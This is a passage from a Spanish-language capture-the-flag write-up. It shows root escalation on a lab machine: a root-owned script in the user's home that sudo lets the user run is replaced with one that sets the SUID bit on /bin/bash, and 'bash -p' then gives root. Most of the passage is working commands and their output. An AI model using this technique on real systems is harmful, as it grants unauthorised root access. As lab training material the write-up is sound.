reset xterm
stty rows 51 columns 237
```
ejecutamos un sudo -l y vemos lo siguiente:
```
sudo -l
Matching Defaults entries for juan on dc4ed2927b32:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User juan may run the following commands on dc4ed2927b32:
    (ALL : ALL) NOPASSWD: /home/juan/mensajes.sh
```
puedo ejecutar un script llamado mensajes.sh que está en mi home...veamos que permisos tiene:
```bash
ls -la /home/juan/mensajes.sh
```
```
-rwx--x--x 1 root root 181 Nov 21 21:03 /home/juan/mensajes.sh
```
no puedo hacer otra cosa que leer,pero está en mi home, vamos a borrarlo y crear el mismo script con lo que quiera
```bash
rm mensajes.sh #elimino el archivo
echo 'chmod u+s /bin/bash' > mensajes.sh # doy permisos suid a la /bin/bash y lo guardo en un script de mismo nombre que el borrado
chmod +x mensajes.sh # doy permisos de ejecución
sudo -u root /home/juan/mensajes.sh #ejecuto el script
```
miramos que permisos tiene ahora la bash:
```bash
ls -la /bin/bash
```
```
-rwsr-xr-x 1 root root 1265648 Mar 29  2024 /bin/bash
```
ejecutamos con la flag -p

```bash
bash -p
```
```
juan@dc4ed2927b32:~$ bash -p
bash-5.2# id
uid=1003(juan) gid=1003(juan) euid=0(root) groups=1003(juan),100(users)
bash-5.2# whoami
root
```

y hasta aquí esta máquina

